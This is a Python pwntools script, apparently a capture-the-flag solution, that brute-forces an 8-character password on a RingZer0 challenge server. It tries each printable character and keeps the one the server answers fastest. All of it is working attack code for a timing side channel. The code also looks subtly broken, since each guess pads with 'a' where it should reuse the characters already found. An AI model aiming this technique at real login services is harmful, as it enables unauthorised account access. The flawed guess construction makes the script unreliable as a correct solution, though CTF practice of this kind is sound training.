import re
from pwn import remote

def get_server_time(response):
    match = re.search(r'Server take ([0-9.]+) seconds', response)
    if match:
        return float(match.group(1))
    return None

def receive_until_colon(nc):
    prompt = b''
    while b':' not in prompt:
        prompt += nc.recv(1)
    return prompt

def find_password(nc):
    # ASCII range for testing: from space (32) to tilde (126)
    ascii_range = range(32, 127)
    password = ''

    # Iterate through each character position in the password
    for i in range(8):
        for ascii_code in ascii_range:
            # Construct the test password
            test_char = chr(ascii_code)
            test_password = 'a' * len(password) + test_char + 'a' * (7 - len(password))
            nc.sendline(test_password.encode())

            # Receive the response and extract server time
            response = receive_until_colon(nc).decode()
            server_time = get_server_time(response)

            # Check the server response time
            if server_time is not None and server_time < 0.008:
                password += test_char
                print(f"Found character: {test_char}")
                break

        if len(password) == 8:
            break

    return password

def main():
    # Connect to the remote server
    nc = remote('challenges.ringzer0team.com', 10066)

    # Receive initial prompt
    print(receive_until_colon(nc).decode())

    # Find the password
    password = find_password(nc)
    print(f"Password: {password}")

    # Close the connection
    nc.close()

if __name__ == "__main__":
    main()
